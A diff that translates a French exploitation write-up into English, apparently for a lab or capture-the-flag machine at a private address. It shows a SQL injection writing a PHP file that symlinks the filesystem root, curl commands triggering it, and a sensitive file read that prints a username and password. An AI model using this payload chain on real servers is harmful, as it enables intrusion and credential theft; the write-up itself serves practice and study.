@@ -1,6 +1,6 @@
-# Exploitation Apache 2.2.22 + SQLi → Symlink RCE
+# Apache 2.2.22 + SQLi → Symlink RCE Exploitation
 
-## 1 — Injection SQL pour écrire le payload PHP
+## 1 — SQL Injection to write the PHP payload
 
 ```sql
 SELECT '<?php symlink("/", "search.php"); echo "OK"; ?>'
@@ -11,15 +11,15 @@ LINES TERMINATED BY '';
 
 ---
 
-### Exécution du payload
+### Payload execution
 ```bash
 curl -ks "https://192.168.56.101/forum/templates_c/test3.php"
-# Réponse attendue : OK
+# Expected response: OK
 ```
 
 ---
 
-### Lecture du fichier sensible
+### Reading the sensitive file
 ```bash
 curl -ks "https://192.168.56.101/forum/templates_c/search.php/home/LOOKATME/password"
 # → lmezard:G!@M6f4Eatau{sF"
